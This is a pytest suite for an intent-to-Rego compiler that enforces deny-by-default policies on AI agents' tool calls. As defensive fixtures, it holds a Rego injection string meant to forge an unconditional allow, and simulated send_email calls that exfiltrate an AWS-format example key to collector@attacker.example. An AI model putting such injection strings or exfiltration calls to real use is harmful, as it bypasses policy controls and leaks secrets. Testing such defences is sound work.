# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""Intent → Rego compilation.

An intent states what an agent class is FOR; everything it does not state is denied. The compiler is
therefore a security boundary in two directions at once: what it emits must deny by default, and what
it accepts must not be able to inject Rego.

Most of these tests evaluate the GENERATED module through a real `opa` rather than asserting on the
source text. Generated Rego that reads correctly and evaluates wrongly is exactly the failure this
whole approach exists to avoid — the same reason the webhook tests apply the JSON patch instead of
counting patch operations.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from norviq.engine.evaluator import OPAEvaluator
from norviq.engine.intent import IntentError, compile_intent, normalize_intent

_OPA = shutil.which("opa")

_BASE_INTENT = {
    "name": "support-bot-refunds",
    "class": "support-bot",
    "call": [
        {
            "id": "read-customer-orders",
            "server": "postgres-prod",
            "match": {"verb": "read", "sql_tables": {"subsetOf": ["orders", "customers"]}},
            "require": {"data_classes": {"noneOf": ["pci", "secret"]}},
        },
        {
            "id": "notify-customer",
            "match": {
                "verb": "send",
                "param_paths.to": {"matches": r"^[^@]+@acme\.com$"},
            },
            "require": {"data_classes": {"noneOf": ["secret"]}},
        },
    ],
}


def _rego(intent: dict) -> str:
    return compile_intent(intent).rego


def _eval(intent: dict, payload: dict, query: str = "decision") -> str:
    """Evaluate the generated module through real OPA, as the engine would.

    Queries the package the module DECLARES rather than a hardcoded one. The hardcode this replaces
    was invisibly coupled to the compiler: when the package moved to `norviq.intent.<class>`, every
    query here returned an empty result and each assertion failed with an unhelpful IndexError rather
    than naming the cause.
    """
    rego = _rego(intent)
    package = re.search(r"(?m)^\s*package\s+([A-Za-z0-9_.]+)\s*$", rego).group(1)
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "intent.rego"
        path.write_text(rego, encoding="utf-8")
        proc = subprocess.run(
            ["opa", "eval", "--v0-compatible", "-d", str(path), "-I", f"data.{package}.{query}"],
            input=json.dumps(payload), capture_output=True, text=True, check=True,
        )
        return json.loads(proc.stdout)["result"][0]["expressions"][0]["value"]


def _call(tool: str, params: dict, **extra) -> dict:
    """A policy input built the way the evaluator builds one, so tests exercise the real contract."""
    ev = OPAEvaluator.__new__(OPAEvaluator)
    payload = {
        "tool_name": tool,
        "tool_params": params,
        "derived": ev._derived_input(SimpleNamespace(tool_name=tool, tool_params=params)),
        "trust_category": "high",
        "mcp": {},
        "agent": {"agent_class": "support-bot", "namespace": "agents"},
    }
    payload.update(extra)
    return payload


# =====================================================================================================
# Schema validation — reject, never coerce
# =====================================================================================================


def test_unknown_field_is_rejected_rather_than_ignored() -> None:
    """A silently-ignored typo becomes a rule that never matches. Under deny-by-default that is an
    outage rather than a leak, but it is still an outage nobody can debug."""
    with pytest.raises(IntentError, match="unknown field"):
        normalize_intent({"name": "n", "class": "c",
                          "call": [{"id": "r", "match": {"recipeint": "a@b.com"}}]})


def test_rule_with_no_predicates_is_rejected() -> None:
    """It would allow everything on its plane — the exact opposite of the intent's purpose."""
    with pytest.raises(IntentError, match="no predicates"):
        normalize_intent({"name": "n", "class": "c", "call": [{"id": "r"}]})


def test_duplicate_rule_ids_are_rejected() -> None:
    """The id lands in the audit row as rule_id; two rules sharing one makes an allow unattributable."""
    with pytest.raises(IntentError, match="duplicate rule id"):
        normalize_intent({"name": "n", "class": "c", "call": [
            {"id": "r", "match": {"verb": "read"}},
            {"id": "r", "match": {"verb": "send"}},
        ]})


def test_invalid_regex_is_rejected_at_compile_time_not_evaluation_time() -> None:
    with pytest.raises(IntentError, match="not a valid regular expression"):
        normalize_intent({"name": "n", "class": "c",
                          "call": [{"id": "r", "match": {"param_paths.to": {"matches": "([a-z"}}}]})


def test_intent_with_no_plane_is_rejected() -> None:
    with pytest.raises(IntentError, match="at least one plane"):
        normalize_intent({"name": "n", "class": "c"})


def test_unknown_operator_is_rejected() -> None:
    with pytest.raises(IntentError):
        normalize_intent({"name": "n", "class": "c",
                          "call": [{"id": "r", "match": {"verb": {"startsWith": "re"}}}]})


def test_same_field_in_match_and_require_is_rejected() -> None:
    """Both compile into one conjunction, so the second would silently overwrite the first."""
    with pytest.raises(IntentError, match="both match and require"):
        normalize_intent({"name": "n", "class": "c", "call": [
            {"id": "r", "match": {"verb": "read"}, "require": {"verb": "send"}}]})


# =====================================================================================================
# Generation properties
# =====================================================================================================


def test_compilation_is_deterministic() -> None:
    """Same intent -> byte-identical Rego, so a diff in `policies` means a real change rather than
    dictionary ordering."""
    assert _rego(_BASE_INTENT) == _rego(json.loads(json.dumps(_BASE_INTENT)))


def test_generated_module_defaults_to_block() -> None:
    """The property the whole approach rests on."""
    assert 'default decision = "block"' in _rego(_BASE_INTENT)


def test_generated_module_is_in_the_package_the_console_classifies_as_an_intent() -> None:
    """`norviq.intent.<class>`, not `norviq.custom`.

    The package is never what the engine evaluates — `opa_client.rewrite_package` replaces it with
    `norviq.managed.<key>` at push time. It is read for CLASSIFICATION: coverage.py maps the
    `norviq.intent.` prefix to kind="intent", and emitting `norviq.custom` made every intent-authored
    policy report on the Overview as an unclassified custom one, while the builder's allowlist mode
    (which already emitted this prefix) classified correctly.
    """
    assert "package norviq.intent.support_bot" in _rego(_BASE_INTENT)


def test_generated_module_passes_the_real_server_write_gate() -> None:
    """An intent is saved through the SAME gated Policies flow as any other rego, so this is the
    check that says the feature works end to end rather than only up to the draft.

    It did not. `assert_decision_resolver` admits a module only on a complete
    `decision = "block"|"escalate" { ... }` rule; the compiler emitted `default decision = "block"`
    alone and was rejected 422 "rego_source must include block or escalate decision" — so an operator
    could observe, propose, dry-run and save a draft, then be refused at the one step that starts
    enforcement, by an error naming rego they never wrote.
    """
    from norviq.api.routers.policies import validate_rego_source

    validate_rego_source(_rego(_BASE_INTENT), "block")  # raises HTTPException on any regression


def test_package_token_matches_sanitize_class() -> None:
    """`package_token` is a deliberate COPY of `threat_intent.sanitize_class` (engine code cannot
    import from api without closing a cycle). Pin them together so the copy cannot drift — a
    divergence would put two generators' policies for one class in two different packages."""
    from norviq.api.threat_intent import sanitize_class
    from norviq.engine.intent.compiler import package_token

    for agent_class in ["report-gen", "support-bot", "9lives", "", "customer support", "a-b_c", "__x__"]:
        assert package_token(agent_class) == sanitize_class(agent_class), agent_class


def test_coverage_reads_the_tool_names_an_intent_admits() -> None:
    """coverage.py's `allow_tools` comes from an `allow_names := {...}` set the OTHER two generators
    emit. An intent has no such set — its scoping is per-rule predicates — so allow_tools came back
    empty and the Overview showed an intent policy governing nothing. Read from the header marker."""
    from norviq.api.routers.coverage import _parse_agent_policy

    parsed = _parse_agent_policy("support-bot", _rego(_BASE_INTENT), 100, "block")
    assert parsed["kind"] == "intent"
    # _BASE_INTENT scopes by VERB, not tool name, so the honest answer is the empty list.
    assert parsed["allow_tools"] == []

    named = _rego({"name": "n", "class": "support-bot", "call": [
        {"id": "r1", "match": {"tool_name": "send_email"}},
        {"id": "r2", "match": {"tool_name": {"in": ["read_table", "execute_sql"]}}},
    ]})
    assert _parse_agent_policy("support-bot", named, 100, "block")["allow_tools"] == [
        "execute_sql", "read_table", "send_email"
    ]


def test_generated_module_has_no_imports() -> None:
    """The engine evaluates each policy as ONE self-contained module and this OPA cannot import
    across packages — the same constraint that forces comprehensive.rego and _shared/horizontal.rego
    to be two copies guarded by a parity test."""
    assert "\nimport " not in _rego(_BASE_INTENT)


def test_rule_ids_are_reported_for_the_console() -> None:
    assert compile_intent(_BASE_INTENT).rule_ids == ("read-customer-orders", "notify-customer")


# =====================================================================================================
# Injection safety — every literal crosses the boundary through JSON encoding
# =====================================================================================================


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_operator_supplied_string_cannot_inject_rego() -> None:
    """The intent is operator-authored, but "operator-authored" is not "trusted to be well-formed":
    a pasted value containing a quote must not be able to terminate the literal and add rules."""
    hostile = '" } \n decision = "allow" { true } \n x := "'
    intent = {"name": "n", "class": "c",
              "call": [{"id": "r", "match": {"tool_name": hostile}}]}
    # still valid Rego (the payload is inert inside a string literal) …
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "i.rego"
        path.write_text(_rego(intent), encoding="utf-8")
        subprocess.run(["opa", "check", "--v0-compatible", str(path)], check=True,
                       capture_output=True, text=True)
    # … and it did NOT create an unconditional allow
    assert _eval(intent, _call("anything", {})) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_hostile_regex_is_confined_to_its_predicate() -> None:
    # A VALID regex that carries quotes and Rego-ish text. (An invalid regex is rejected earlier, by
    # the schema — asserted separately — so the interesting case is the one that compiles.)
    hostile = r'.*"; decision = "allow'
    intent = {"name": "n", "class": "c",
              "call": [{"id": "r", "match": {"param_paths.to": {"matches": hostile}}}]}
    assert _eval(intent, _call("send_email", {"to": "a@b.com"})) == "block"


# =====================================================================================================
# Evaluation — the generated policy must actually decide correctly
# =====================================================================================================


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_call_inside_the_intent_is_allowed() -> None:
    payload = _call("send_email", {"to": "customer@acme.com", "body": "your refund is on its way"})
    assert _eval(_BASE_INTENT, payload) == "allow"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_the_allow_is_attributed_to_the_rule_that_permitted_it() -> None:
    payload = _call("send_email", {"to": "customer@acme.com", "body": "hello"})
    assert _eval(_BASE_INTENT, payload, "rule_id") == "notify-customer"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_call_outside_the_intent_is_denied_with_no_detector_involved() -> None:
    """The §11.5 lesson: a detector list only catches what someone thought of. Here the mail is denied
    because the recipient was never in scope — no secret-detector required."""
    payload = _call("send_email", {"to": "collector@attacker.example", "body": "hello"})
    assert _eval(_BASE_INTENT, payload) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_an_unknown_tool_is_denied_rather_than_falling_through() -> None:
    assert _eval(_BASE_INTENT, _call("wire_transfer", {"amount": "1000"})) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_secret_in_an_otherwise_permitted_call_is_denied() -> None:
    """Belt and braces on top of scope: the recipient IS in scope here, and the call is still denied
    because `data_classes` picked the AWS key out of the body. This is the exact §11.5 payload."""
    payload = _call("send_email", {
        "to": "customer@acme.com",
        "body": "AKIAIOSFODNN7EXAMPLE wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"})
    assert "secret" in payload["derived"]["data_classes"]
    assert _eval(_BASE_INTENT, payload) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_sql_outside_the_permitted_tables_is_denied() -> None:
    payload = _call("execute_sql", {"q": "SELECT * FROM salaries"})
    payload["mcp"] = {"server": "postgres-prod"}
    assert _eval(_BASE_INTENT, payload) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_permitted_read_on_a_permitted_server_is_allowed() -> None:
    payload = _call("select_rows", {"q": "SELECT id FROM orders"})
    payload["mcp"] = {"server": "postgres-prod"}
    assert _eval(_BASE_INTENT, payload) == "allow"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_the_right_call_on_the_wrong_server_is_denied() -> None:
    """Scoping to an integration is the point of `server:` — the same SQL against a different MCP
    server is a different action."""
    payload = _call("select_rows", {"q": "SELECT id FROM orders"})
    payload["mcp"] = {"server": "postgres-staging"}
    assert _eval(_BASE_INTENT, payload) == "block"


# =====================================================================================================
# The near miss — what makes deny-by-default survive contact with an operator
# =====================================================================================================


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_denial_names_the_closest_rule_and_the_clause_that_failed() -> None:
    """"Denied" is not an answer when the rule that denied is the ABSENCE of a rule. This line is the
    difference between an operator tightening a predicate and an operator switching the policy off."""
    payload = _call("send_email", {"to": "collector@attacker.example", "body": "hello"})
    reason = _eval(_BASE_INTENT, payload, "reason")
    assert "notify-customer" in reason
    # THE substance: the operator is told WHICH clause refused, not merely that nothing matched.
    assert "param_paths.to matches" in reason
    # Exactly ONE clause failed — the recipient. Asserted as a count rather than a literal "met 3/4",
    # because the denominator is the rule's predicate total and legitimately moves whenever the
    # compiler adds a predicate (it went 4 -> 6 when per-root availability predicates were added to
    # close a fail-open). Pinning the ratio made this test fail for a reason that was not a defect,
    # while a real regression — the near miss naming the WRONG clause — would have slipped past both.
    met, total = (int(n) for n in re.search(r"met (\d+)/(\d+)", reason).groups())
    assert total - met == 1, reason
    # And the version-skew guard is NOT what failed here: this payload is from a current engine.
    assert "published by this engine" not in reason


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_an_allow_reports_the_rule_that_permitted_it() -> None:
    payload = _call("send_email", {"to": "customer@acme.com", "body": "hi"})
    assert _eval(_BASE_INTENT, payload, "reason") == "allowed by intent rule notify-customer"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_near_miss_is_deterministic_when_two_rules_tie() -> None:
    """Two rules failing the same number of predicates must not report a different one per run."""
    intent = {"name": "n", "class": "c", "call": [
        {"id": "bbb", "match": {"verb": "send"}},
        {"id": "aaa", "match": {"verb": "write"}},
    ]}
    payload = _call("search_docs", {"q": "x"})
    first = _eval(intent, payload, "reason")
    assert first == _eval(intent, payload, "reason")
    assert "aaa" in first  # sorted, so the tie breaks the same way every time


# =====================================================================================================
# Fail-closed behaviour
# =====================================================================================================


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_an_empty_input_denies() -> None:
    """A malformed or truncated input must never be an accidental allow."""
    assert _eval(_BASE_INTENT, {}) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_call_with_no_mcp_context_still_evaluates_every_rule() -> None:
    """`input.mcp` is absent for non-MCP traffic. A bare `input.mcp.server` would make the whole
    predicate OBJECT undefined and silently delete every rule — fail-closed, but with no near-miss to
    report, so the operator would see a denial with no explanation at all."""
    payload = _call("send_email", {"to": "customer@acme.com", "body": "hi"})
    payload.pop("mcp")
    assert _eval(_BASE_INTENT, payload) == "allow"
    denied = _call("send_email", {"to": "nope@evil.example"})
    denied.pop("mcp")
    assert "closest" in _eval(_BASE_INTENT, denied, "reason")


# =====================================================================================================
# Planes — one module governs all four directions
# =====================================================================================================


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_rule_on_one_plane_does_not_govern_another() -> None:
    """The Answer plane is egress too, and nothing may be answered unless an answer rule says so."""
    intent = {"name": "n", "class": "c",
              "answer": [{"id": "roots", "match": {"tool_name": "roots/list"}}]}
    on_plane = _call("roots/list", {})
    on_plane["direction"] = "answer"
    assert _eval(intent, on_plane) == "allow"
    # the same request arriving on the call plane is not covered by an answer rule
    off_plane = _call("roots/list", {})
    off_plane["direction"] = "call"
    assert _eval(intent, off_plane) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_direction_defaults_to_call_so_existing_traffic_is_governed() -> None:
    """Every caller that predates the four-plane model sends no `direction`; those calls must be
    governed by the call plane rather than escaping every rule."""
    payload = _call("send_email", {"to": "customer@acme.com", "body": "hi"})
    assert "direction" not in payload
    assert _eval(_BASE_INTENT, payload) == "allow"


# =====================================================================================================
# Dry run — the reason a default-deny policy can be proposed at all
# =====================================================================================================


def _fake_evaluator(script: dict):
    """Evaluator stub keyed on tool_name, so the dry-run logic is tested without spawning OPA."""
    def _ev(_rego: str, payload: dict) -> dict:
        return script[payload["tool_name"]]
    return _ev


def test_dry_run_counts_what_would_break_and_what_would_pass() -> None:
    from norviq.engine.intent import dry_run

    ev = _fake_evaluator({
        "search_docs": {"decision": "allow", "rule_id": "read-customer-orders", "reason": "ok"},
        "send_email": {"decision": "allow", "rule_id": "notify-customer", "reason": "ok"},
        "wire_transfer": {"decision": "block", "rule_id": "intent_no_match",
                          "reason": "no intent rule matched; closest notify-customer met 2/4, failed: verb == send"},
    })
    report = dry_run(_BASE_INTENT, [
        _call("search_docs", {"q": "x"}),
        _call("send_email", {"to": "a@acme.com"}),
        _call("wire_transfer", {"amount": "1000"}),
    ], evaluator=ev)

    assert (report.total, report.would_allow, report.would_block) == (3, 2, 1)
    assert report.coverage == {"read-customer-orders": 1, "notify-customer": 1}


def test_dry_run_keeps_the_near_miss_for_every_call_that_would_break() -> None:
    """The blocked list is what the operator actually reads, so it is kept whole rather than
    summarised to a count — a number tells them something breaks, not what to fix."""
    from norviq.engine.intent import dry_run

    ev = _fake_evaluator({"wire_transfer": {
        "decision": "block", "rule_id": "intent_no_match",
        "reason": "no intent rule matched; closest notify-customer met 2/4, failed: verb == send"}})
    report = dry_run(_BASE_INTENT, [_call("wire_transfer", {"amount": "1"})], evaluator=ev)

    assert len(report.blocked) == 1
    assert "closest notify-customer" in report.blocked[0].reason
    assert report.as_dict()["blocked"][0]["tool_name"] == "wire_transfer"


def test_dry_run_reports_rules_that_matched_nothing() -> None:
    """A rule covering zero recorded calls is the interesting one: either the traffic does not
    exercise it, or it is written wrongly and will never match anything."""
    from norviq.engine.intent import dry_run

    ev = _fake_evaluator({"send_email": {"decision": "allow", "rule_id": "notify-customer", "reason": "ok"}})
    report = dry_run(_BASE_INTENT, [_call("send_email", {"to": "a@acme.com"})], evaluator=ev)
    assert report.unused_rules == ["read-customer-orders"]


def test_dry_run_treats_a_missing_decision_as_block() -> None:
    """An evaluator that returns nothing (undefined document, transport error) must not read as a
    permissive result on the screen the operator approves from."""
    from norviq.engine.intent import dry_run

    report = dry_run(_BASE_INTENT, [_call("x", {})], evaluator=lambda _r, _p: {})
    assert report.would_block == 1


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_dry_run_against_real_opa_matches_enforcement() -> None:
    """The replay must use the SAME Rego that would enforce. A second implementation of the predicate
    semantics would drift, and the drifted one is the one the operator was shown before approving."""
    from norviq.engine.intent import dry_run

    calls = [
        _call("send_email", {"to": "customer@acme.com", "body": "hi"}),      # in scope
        _call("send_email", {"to": "collector@attacker.example"}),           # out of scope
    ]
    report = dry_run(_BASE_INTENT, calls)
    assert (report.would_allow, report.would_block) == (1, 1)
    assert "param_paths.to matches" in report.blocked[0].reason
    # and enforcement agrees, call for call
    assert _eval(_BASE_INTENT, calls[0]) == "allow"
    assert _eval(_BASE_INTENT, calls[1]) == "block"


# =====================================================================================================
# Proposal — observe → propose → dry-run → apply, the first step
# =====================================================================================================


def _traffic() -> list:
    sql = [_call("select_rows", {"q": f"SELECT {i} FROM orders"}) for i in range(2)]
    for payload in sql:
        payload["mcp"] = {"server": "postgres-prod"}
    mail = [_call("send_email", {"to": f"c{i}@acme.com", "body": "hi"}) for i in range(3)]
    return sql + mail


def test_proposal_groups_by_server_and_verb() -> None:
    from norviq.engine.intent import propose_intent

    intent = propose_intent("proposed", "support-bot", _traffic())
    verbs = {r["match"]["verb"] for r in intent["call"]}
    assert verbs == {"read", "send"}
    sql_rule = next(r for r in intent["call"] if r["match"]["verb"] == "read")
    assert sql_rule["server"] == "postgres-prod"


def test_proposal_carries_observed_tool_names_as_a_perimeter() -> None:
    """Grouping by verb describes the operation; the name list is what holds against a tool nobody
    has seen before, because a novel name cannot be classified into an allowlist it is not on."""
    from norviq.engine.intent import propose_intent

    intent = propose_intent("proposed", "support-bot", _traffic())
    names = {n for r in intent["call"] for n in r["match"].get("tool_name", {}).get("in", [])}
    assert names == {"select_rows", "send_email"}


def test_proposal_constrains_the_recipient_domain_when_traffic_is_unambiguous() -> None:
    from norviq.engine.intent import propose_intent

    intent = propose_intent("proposed", "support-bot", _traffic())
    send = next(r for r in intent["call"] if r["match"]["verb"] == "send")
    assert send["match"]["param_paths.to"]["matches"] == r"^[^@]+@acme\.com$"


def test_proposal_does_not_claim_a_domain_from_mixed_traffic() -> None:
    """Two domains in the window means the class demonstrably mails both; inventing a constraint
    would produce a draft whose dry-run breaks real traffic for no reason."""
    from norviq.engine.intent import propose_intent

    calls = [_call("send_email", {"to": "a@acme.com"}),
             _call("send_email", {"to": "b@other.example"}),
             _call("send_email", {"to": "c@acme.com"})]
    send = propose_intent("p", "c", calls)["call"][0]
    assert "param_paths.to" not in send["match"]


def test_proposal_always_requires_absence_of_credentials() -> None:
    """Safe to propose regardless of what was observed: if requiring it breaks recorded traffic, that
    is a finding rather than a false positive."""
    from norviq.engine.intent import propose_intent

    for rule in propose_intent("p", "c", _traffic())["call"]:
        assert rule["require"]["data_classes"]["noneOf"] == ["secret"]


def test_proposal_rule_ids_are_unique() -> None:
    from norviq.engine.intent import propose_intent

    ids = [r["id"] for r in propose_intent("p", "c", _traffic())["call"]]
    assert len(ids) == len(set(ids))


def test_proposal_compiles_and_is_a_valid_intent() -> None:
    """The proposal must be consumable by the compiler with no hand-editing, or the loop is broken at
    its first step."""
    from norviq.engine.intent import propose_intent

    compile_intent(propose_intent("proposed", "support-bot", _traffic()))


def test_proposal_from_no_traffic_is_refused() -> None:
    """An intent proposed from nothing would allow nothing — a silent outage dressed as a policy."""
    from norviq.engine.intent import propose_intent

    with pytest.raises(ValueError, match="zero recorded calls"):
        propose_intent("p", "c", [])


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_proposed_intent_covers_the_traffic_it_was_proposed_from() -> None:
    """The closing property of the whole loop: propose from observed traffic, then replay that same
    traffic, and nothing legitimate should break."""
    from norviq.engine.intent import dry_run, propose_intent

    traffic = _traffic()
    report = dry_run(propose_intent("proposed", "support-bot", traffic), traffic)
    assert report.would_block == 0, [b.reason for b in report.blocked]
    assert report.unused_rules == []


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_proposed_intent_still_denies_traffic_it_never_saw() -> None:
    """Covering observed traffic must not mean covering everything — otherwise the proposal is just
    an allow-all with extra steps."""
    from norviq.engine.intent import dry_run, propose_intent

    intent = propose_intent("proposed", "support-bot", _traffic())
    novel = [_call("wire_transfer", {"amount": "1000"}),
             _call("send_email", {"to": "collector@attacker.example"})]
    report = dry_run(intent, novel)
    assert report.would_block == 2


# --- regression: `in` with more than one element -------------------------------------------------


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_in_operator_with_several_values_does_not_conflict_at_eval_time() -> None:
    """`list[_] == x` ITERATES, so inside the predicate object literal it yields one binding per
    element — and a complete rule with more than one output is an eval_conflict_error raised at QUERY
    time, not at compile time. A single-element list yields exactly one binding and hides it
    completely, which is why every earlier test passed. Found by a real dry-run against a proposal
    whose tool list had grown to two names."""
    intent = {"name": "n", "class": "c", "call": [
        {"id": "multi", "match": {"tool_name": {"in": ["send_email", "post_webhook", "send_sms"]}}}
    ]}
    assert _eval(intent, _call("post_webhook", {})) == "allow"      # middle of the list
    assert _eval(intent, _call("send_email", {})) == "allow"        # first
    assert _eval(intent, _call("send_sms", {})) == "allow"          # last
    assert _eval(intent, _call("wire_transfer", {})) == "block"     # absent


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_multi_value_in_still_explains_its_near_miss() -> None:
    """The conflict error made the whole query fail, so the explainer went with it."""
    intent = {"name": "n", "class": "c", "call": [
        {"id": "multi", "match": {"verb": "send", "tool_name": {"in": ["send_email", "post_webhook"]}}}
    ]}
    reason = _eval(intent, _call("wire_transfer", {}), "reason")
    assert "closest multi" in reason
    assert "tool_name in" in reason


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_scoping_predicate_does_not_fail_open_on_an_engine_without_the_fact() -> None:
    """The most serious defect this compiler has had, found on a live cluster rather than by reading.

    The collection operators compile to counted comprehensions, and a comprehension whose body is
    undefined yields the EMPTY ARRAY rather than becoming undefined. So on an engine that does not
    publish `data_classes` / `destinations`, `count([]) == 0` is TRUE — `noneOf` and `subsetOf` are
    vacuously satisfied, the rule matches, and the intent ALLOWS precisely the call it exists to refuse.

    Observed: the same `send_email` to an attacker address carrying an AWS key evaluated `allow`
    against an AKS engine predating these facts and `block` against one carrying them.
    """
    intent = {
        "name": "no-secret-egress", "class": "support-bot",
        "call": [{
            "id": "mail-acme",
            "match": {"tool_name": "send_email"},
            "require": {"data_classes": {"noneOf": ["secret"]},
                        "destinations.emails": {"subsetOf": ["ops@acme.com"]}},
        }],
    }
    attacker = {
        "tool_name": "send_email", "direction": "call",
        "tool_params": {"to": "collector@attacker.example", "body": "AKIAIOSFODNN7EXAMPLE"},
        "agent": {"agent_class": "support-bot", "namespace": "agents"}, "call_depth": 0,
    }
    old_engine = {**attacker, "derived": {"verb": "send", "tool_kind": "other", "param_values": [],
                                          "param_values_lower": [], "sql_normalized": "", "sql_statements": []}}
    current = {**attacker, "derived": {**old_engine["derived"], "data_classes": ["secret"],
                                       "destinations": {"emails": ["collector@attacker.example"],
                                                        "urls": [], "hosts": [], "schemes": []}}}
    assert _eval(intent, current) == "block"
    # The whole point: an engine that cannot evaluate the scope must DENY, not admit.
    assert _eval(intent, old_engine) == "block"
    # And it must say why, or the operator diagnoses a version skew as a broken policy and removes it.
    assert "published by this engine" in _eval(intent, old_engine, "reason")

    # A legitimate call on a CURRENT engine is unaffected — the guard must not deny everything.
    ok = {**attacker, "tool_params": {"to": "ops@acme.com", "body": "hi"},
          "derived": {**old_engine["derived"], "data_classes": [],
                      "destinations": {"emails": ["ops@acme.com"], "urls": [], "hosts": [], "schemes": []}}}
    assert _eval(intent, ok) == "allow"
